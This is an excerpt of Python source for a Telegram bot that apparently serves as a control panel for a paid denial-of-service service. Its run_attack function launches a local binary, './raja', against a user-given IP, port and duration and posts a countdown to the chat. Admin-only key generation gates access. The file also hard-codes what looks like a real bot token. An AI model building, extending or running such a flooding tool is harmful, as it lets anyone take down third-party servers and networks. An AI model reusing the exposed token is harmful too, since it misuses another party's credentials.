...
async def start(update: Update, context: CallbackContext) -> None:
    ...
    await update.message.reply_text(f"👋 Welcome {username}!\nThis Tool is provided by @rajaraj_01. Select an option:", reply_markup=main_menu_keyboard())
...
# Run the attack using an external command with a real-time countdown
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        # Execute the external command here (replace this with your actual attack logic)
        process = await asyncio.create_subprocess_shell(
            f"./raja {ip} {port} {duration} 35",
        ...
        for second in range(duration, 0, -1):
            if second % 10 == 0 or second <= 5:  # Update every 10 seconds or for the last 5 seconds
                await context.bot.send_message(chat_id=chat_id, text=f"⏳ {second} seconds remaining...")
            await asyncio.sleep(1)  # Wait for 1 second

        # Collect the output once the process is complete
        ...
        await show_automatic_mode(chat_id, context)
...
async def genkey(update: Update, context: CallbackContext):
    ...
    if user_id in ADMIN_IDS:
        ...
        await context.bot.send_message(user_id, text="ONLY OWNER CAN USE💀OWNER @rajaraj_01")
...
BOT_TOKEN = '6998943959:AAHXpXp6tU8iPXn6vWJ-TIh3bZMBbQcJNdo'
ADMIN_IDS = ['1383460048']  # Admin user IDs
